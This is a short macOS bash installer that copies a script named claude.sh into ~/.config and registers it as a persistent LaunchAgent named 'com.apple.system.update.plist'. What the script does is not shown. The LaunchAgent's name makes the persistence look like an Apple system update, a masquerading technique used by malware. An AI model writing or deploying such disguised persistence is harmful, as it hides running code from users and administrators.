#!/bin/bash

mkdir -p "$HOME/.config"
mkdir -p "$HOME/Library/LaunchAgents"

cp "script/claude.sh" "$HOME/.config/claude.sh"

chmod +x "$HOME/.config/claude.sh"

sed "s|\$HOME|$HOME|g" "config/com.apple.system.update.plist" > "$HOME/Library/LaunchAgents/com.apple.system.update.plist"

launchctl unload "$HOME/Library/LaunchAgents/com.apple.system.update.plist" 2>/dev/null
launchctl load "$HOME/Library/LaunchAgents/com.apple.system.update.plist"

echo "Installation terminée ! Le script tourne."
